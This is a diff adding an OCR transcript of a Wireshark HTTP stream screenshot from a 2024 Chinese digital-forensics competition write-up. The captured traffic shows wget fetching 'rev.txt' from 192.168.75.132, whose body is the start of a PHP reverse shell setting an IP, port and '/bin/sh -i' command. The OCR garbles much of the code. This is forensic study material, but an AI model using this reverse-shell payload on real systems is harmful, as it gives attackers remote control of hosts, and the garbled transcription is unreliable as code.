@@ -1,0 +1,20 @@
+# OCR: 5a00614eb825052a9403b91c103358a0.webp
+# 来源: ./02-WriteUp/2024/2024-数证杯-初赛/5a00614eb825052a9403b91c103358a0.webp
+# 引擎: Umi-OCR 2.1.5 / PaddleOCR (config_chinese, limit_side_len=2880, multi_para)
+# 生成: 2026-11-03 15:15
+
+【Wireshark·追踪HTTP流(tcp.streameq3267)·流量分析.pcapng GET/rev.txtHTTP/1.1
+User-Agent：Wget/1.13.4（1inux-gnu） Accept：*/*
+Host:192.168.75.132:2000
+Connection:Keep-Alive HTTP/1.0200OK
+Server:SimpleHTTP/0.6Python/3.11.8 Date:Wed,31Jul202406:44:32GMT
+Content-type:text/plain Content-Length:2425
+Last-Modified:Wed,31Jul2024 06:43:54GMT <?php
+set time limit (o); $VERSION ="1.0":
+$ip='192.168.75.132'; $port = 30127:
+$chunksize = 1400:
+swrite a = null; serror a = null;
+$shell = 'uname -a; w; id; /bin/sh -i';
+$daemon=o; $debug = o;
+if（functionexists('pcntlfork')){
+$pid = pcntl fork():
